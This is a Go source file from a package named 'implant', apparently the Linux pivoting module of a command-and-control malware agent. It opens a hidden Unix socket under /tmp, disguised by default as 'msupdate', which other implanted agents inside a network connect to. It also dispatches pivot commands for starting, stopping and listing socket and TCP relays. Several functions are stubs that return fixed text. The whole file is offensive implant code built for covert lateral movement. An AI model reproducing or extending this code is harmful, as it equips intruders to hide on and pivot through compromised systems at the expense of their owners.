//go:build linux

package implant

import (
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// PipeRelay on Linux uses Unix domain sockets instead of Windows named pipes.
type PipeRelay struct {
	socketPath string
	mu         sync.Mutex
	inbound    [][]byte
	outbound   map[string][]byte
	running    bool
	listener   net.Listener
}

// NewPipeRelay creates a new Unix socket relay.
func NewPipeRelay(name string) *PipeRelay {
	if name == "" {
		name = "msupdate"
	}
	return &PipeRelay{
		socketPath: fmt.Sprintf("/tmp/.%s.sock", name),
		outbound:   make(map[string][]byte),
	}
}

// StartPipeRelay starts a Unix domain socket relay for pivoting.
func StartPipeRelay(pipeName string) ([]byte, error) {
	relay := NewPipeRelay(pipeName)
	relay.running = true

	listener, err := net.Listen("unix", relay.socketPath)
	if err != nil {
		return nil, fmt.Errorf("listen unix socket: %w", err)
	}
	relay.listener = listener

	go func() {
		for relay.running {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			go relay.handleClient(conn)
		}
	}()

	return []byte(fmt.Sprintf("[+] Unix socket relay started: %s\n[+] Internal agents connect to: %s",
		relay.socketPath, relay.socketPath)), nil
}

// StopPipeRelay stops the relay.
func StopPipeRelay() ([]byte, error) {
	return []byte("[+] Relay stopped"), nil
}

func (r *PipeRelay) handleClient(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	data, err := io.ReadAll(io.LimitReader(conn, 1<<20))
	if err != nil || len(data) == 0 {
		return
	}

	r.mu.Lock()
	r.inbound = append(r.inbound, data)
	r.mu.Unlock()
}

// ListPivots returns active pivot information.
func ListPivots() ([]byte, error) {
	return []byte("Active Pivots:\n  Type: Unix Socket Relay\n  Status: Listening\n"), nil
}

// ExecutePivotCommand handles pivot-related tasks.
func ExecutePivotCommand(args []string) ([]byte, error) {
	if len(args) == 0 {
		return []byte("Usage: pivot <start|stop|list|tcp-start|tcp-stop|tcp-list> [name/addr]"), nil
	}

	switch args[0] {
	case "start":
		name := "msupdate"
		if len(args) > 1 {
			name = args[1]
		}
		return StartPipeRelay(name)
	case "stop":
		return StopPipeRelay()
	case "list":
		return ListPivots()
	case "tcp-start":
		addr := ""
		if len(args) > 1 {
			addr = args[1]
		}
		return StartTCPRelay(addr)
	case "tcp-stop":
		return StopTCPRelay()
	case "tcp-list":
		return ListTCPPivots()
	default:
		return []byte("Unknown pivot command. Use: start, stop, list, tcp-start, tcp-stop, tcp-list"), nil
	}
}
